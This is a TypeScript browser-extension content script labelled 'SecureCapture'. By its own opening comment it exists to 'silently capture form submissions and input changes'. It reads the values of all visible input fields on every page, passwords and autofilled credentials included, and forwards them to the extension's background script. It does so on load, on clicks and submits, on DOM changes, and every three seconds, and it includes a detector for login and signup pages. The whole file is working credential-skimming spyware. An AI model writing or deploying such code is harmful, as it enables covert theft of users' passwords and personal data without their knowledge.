
// Content script to silently capture form submissions and input changes

// Auto-detect login and signup pages
const checkIfLoginOrSignupPage = () => {
  const pageText = document.body.innerText.toLowerCase();
  const url = window.location.href.toLowerCase();
  
  // Check URL for common login/signup patterns
  const urlPatterns = ['login', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'account', 'auth'];
  const urlMatch = urlPatterns.some(pattern => url.includes(pattern));
  
  // Check page content for common login/signup text
  const contentPatterns = ['login', 'sign in', 'signup', 'sign up', 'register', 'create account', 'forgot password'];
  const contentMatch = contentPatterns.some(pattern => pageText.includes(pattern));
  
  // Check for password fields as a strong indicator
  const hasPasswordField = document.querySelectorAll('input[type="password"]').length > 0;
  
  return urlMatch || (contentMatch && hasPasswordField);
};

// Function to detect autofilled inputs
const isInputAutofilled = (input: HTMLInputElement): boolean => {
  // Different browsers have different ways of indicating autofill
  return (
    // Chrome/Safari
    input.matches(':-webkit-autofill') || 
    // Firefox
    input.matches(':-moz-autofill') ||
    // Explicit autofill attribute
    input.getAttribute('autocomplete') !== 'off' ||
    // Classes that might indicate autofill
    input.classList.contains('autofill') ||
    // Check for background color which might indicate autofill
    window.getComputedStyle(input).backgroundColor.includes('rgb(250, 255, 189)')
  );
};

// Function to capture all form inputs on the page
const captureFormInputs = () => {
  const forms = document.querySelectorAll('form');
  const capturedData: any[] = [];
  let hasFormData = false;
  
  // Process forms
  forms.forEach(form => {
    const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
    const formInputs: any[] = [];
    
    inputs.forEach(input => {
      const inputEl = input as HTMLInputElement;
      // Only capture inputs that have values
      if (inputEl.value.trim()) {
        const isAutoFill = isInputAutofilled(inputEl);
        
        formInputs.push({
          type: inputEl.type,
          name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
          value: inputEl.value,
          isAutoFill
        });
        
        hasFormData = true;
      }
    });
    
    if (formInputs.length > 0) {
      capturedData.push({
        formAction: form.action,
        formId: form.id,
        formName: form.name,
        inputs: formInputs
      });
    }
  });
  
  // If there are no forms, try to capture standalone inputs (common in modern SPAs)
  if (!hasFormData) {
    const standaloneInputs = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
    const formlessInputs: any[] = [];
    
    standaloneInputs.forEach(input => {
      const inputEl = input as HTMLInputElement;
      if (inputEl.value.trim()) {
        const isAutoFill = isInputAutofilled(inputEl);
        
        formlessInputs.push({
          type: inputEl.type,
          name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
          value: inputEl.value,
          isAutoFill
        });
      }
    });
    
    if (formlessInputs.length > 0) {
      capturedData.push({
        formAction: window.location.href,
        formId: 'formless',
        formName: 'formless',
        inputs: formlessInputs
      });
    }
  }
  
  return capturedData;
};

// Send data to background script
const sendDataToBackground = (data: any[]) => {
  if (data.length === 0) return;
  
  chrome.runtime.sendMessage({
    type: 'FORM_DATA',
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    data
  });
};

// Setup input change detection using MutationObserver
const setupInputObserver = () => {
  const targetNode = document.body;
  const config = { 
    childList: true, 
    subtree: true, 
    attributes: true, 
    attributeFilter: ['value'] 
  };

  // Callback for input changes
  const callback = (mutationsList: MutationRecord[]) => {
    let inputsChanged = false;
    
    for (const mutation of mutationsList) {
      if (mutation.type === 'childList') {
        // Check for new input elements
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as Element;
            const inputs = element.querySelectorAll('input');
            if (inputs.length > 0) {
              inputsChanged = true;
            }
          }
        });
      } else if (mutation.type === 'attributes') {
        if (mutation.target instanceof HTMLInputElement) {
          inputsChanged = true;
        }
      }
    }
    
    if (inputsChanged) {
      // Capture form data after a short delay to allow values to settle
      setTimeout(() => {
        const data = captureFormInputs();
        sendDataToBackground(data);
      }, 500);
    }
  };

  // Create and start the observer
  const observer = new MutationObserver(callback);
  observer.observe(targetNode, config);
  
  // Also periodically check for form data
  setInterval(() => {
    const data = captureFormInputs();
    sendDataToBackground(data);
  }, 3000);
};

// Setup form submission listeners
const setupFormSubmitListeners = () => {
  document.addEventListener('submit', (event) => {
    // Capture form data on submit
    const data = captureFormInputs();
    sendDataToBackground(data);
  });
  
  // Detect button clicks that might trigger form submission
  document.addEventListener('click', (event) => {
    const target = event.target as HTMLElement;
    if (
      target.tagName === 'BUTTON' || 
      (target.tagName === 'INPUT' && ['submit', 'button'].includes((target as HTMLInputElement).type)) ||
      target.closest('button') || 
      target.getAttribute('role') === 'button'
    ) {
      // Capture form data after click, as it might trigger a form submission
      setTimeout(() => {
        const data = captureFormInputs();
        sendDataToBackground(data);
      }, 100);
    }
  });
};

// Initialize the content script
const init = () => {
  console.log('SecureCapture: Content script initialized');
  
  // Capture initial data after page load
  setTimeout(() => {
    const data = captureFormInputs();
    sendDataToBackground(data);
  }, 1000);
  
  // Setup form submission listeners
  setupFormSubmitListeners();
  
  // Setup input observer
  setupInputObserver();
};

// Run the script after the page has fully loaded
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  init();
} else {
  window.addEventListener('load', init);
}
